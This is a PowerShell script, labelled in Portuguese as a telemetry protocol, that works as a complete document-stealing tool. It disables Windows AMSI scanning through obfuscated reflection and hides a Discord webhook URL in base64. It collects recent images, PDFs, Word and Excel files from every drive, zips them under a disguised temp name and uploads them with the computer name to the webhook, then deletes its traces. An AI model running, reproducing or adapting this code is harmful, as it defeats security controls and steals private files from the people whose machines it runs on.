# [V26: Protocolo de Telemetria - Bypass AMSI]
try {
    $n = "Sys" + "tem.Man" + "age" + "ment.Auto" + "mation.Am" + "siUt" + "ils"
    $t = [Ref].Assembly.GetType($n)
    $f = $t.GetField("am" + "siInitFai" + "led", "NonPublic,Static")
    $f.SetValue($null, $true)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
    $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

    Write-Host "[*] Executando busca..." -ForegroundColor Cyan
    $tempDir = Join-Path $env:TEMP ("diag_" + (Get-Random))
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Busca (30 dias / <15MB)
    $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
            $p = $_.FullName
            $isEx = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isEx=$true;break}}
            !$isEx -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
        } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
    }

    $zipFile = Join-Path $env:TEMP "cache_82.tmp"
    if ((Get-ChildItem $tempDir).Count -gt 0) {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
        curl.exe -k -s -F "file=@$zipFile" -F "content=🟢 V26 Sucesso: $env:COMPUTERNAME" $u
    }
}
catch {
    # Captura de Erro e Telemetria para Discord
    $msg = "🔴 Erro em $($env:COMPUTERNAME): $($_.Exception.Message)"
    Write-Host $msg -ForegroundColor Red
    curl.exe -k -s -F "content=$msg" $u
}
finally {
    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
}
